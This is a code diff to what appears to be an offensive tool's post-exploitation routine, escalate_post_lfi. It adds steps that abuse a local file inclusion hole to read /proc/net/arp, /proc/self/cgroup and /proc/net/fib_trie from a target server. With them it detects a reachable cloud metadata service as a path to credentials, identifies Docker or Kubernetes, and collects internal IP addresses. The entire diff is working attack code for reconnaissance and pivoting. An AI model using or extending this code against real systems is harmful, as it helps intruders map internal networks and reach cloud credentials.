@@ -13889,4 +13889,37 @@ def escalate_post_lfi(
         except Exception:
             pass
 
+    # 7. Cloud metadata via /proc/net/arp (detect 169.254.x.x = AWS/GCP IMDS)
+    try:
+        _arp = request_fn("/proc/net/arp")
+        if _arp and "169.254.169.254" in _arp:
+            result["cloud_imds_detected"] = True
+            step("  post-lfi: 169.254.169.254 detectado en /proc/net/arp — IMDS alcanzable via SSRF")
+            if result["escalation_level"] == "none":
+                result["escalation_level"] = "creds"
+    except Exception:
+        pass
+
+    # 8. /proc/self/cgroup — detect K8s/Docker container environment
+    try:
+        _cgroup = request_fn("/proc/self/cgroup")
+        if _cgroup and ("docker" in _cgroup or "kubepods" in _cgroup or "containerd" in _cgroup):
+            _container_env = "kubernetes" if "kubepods" in _cgroup else "docker"
+            result["container_env"] = _container_env
+            step(f"  post-lfi: entorno {_container_env} detectado via /proc/self/cgroup")
+    except Exception:
+        pass
+
+    # 9. /proc/net/fib_trie — extract internal network CIDR
+    try:
+        _fib = request_fn("/proc/net/fib_trie")
+        if _fib and "LOCAL" in _fib:
+            # Extract first few non-loopback IPs
+            _ip_hits = re.findall(r"\b(10\.\d+\.\d+\.\d+|172\.1[6-9]\.\d+\.\d+|192\.168\.\d+\.\d+)\b", _fib)
+            if _ip_hits:
+                result["internal_ips"] = list(dict.fromkeys(_ip_hits))[:5]
+                step(f"  post-lfi: IPs internas via /proc/net/fib_trie: {result['internal_ips']}")
+    except Exception:
+        pass
+
     return result
